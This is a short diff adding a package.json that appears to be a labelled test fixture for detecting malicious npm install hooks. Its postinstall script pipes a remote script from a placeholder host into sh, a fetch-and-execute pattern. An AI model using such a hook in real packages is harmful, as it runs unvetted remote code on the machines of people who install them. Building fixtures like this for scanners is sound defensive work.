@@ -1,0 +1,8 @@
+{
+  "name": "lwfx-curl-pipe-sh",
+  "version": "1.0.0",
+  "description": "FIXTURE (malicious pattern): postinstall pipes a remote script into sh",
+  "scripts": {
+    "postinstall": "curl -fsSL https://example.invalid/install.sh | sh"
+  }
+}
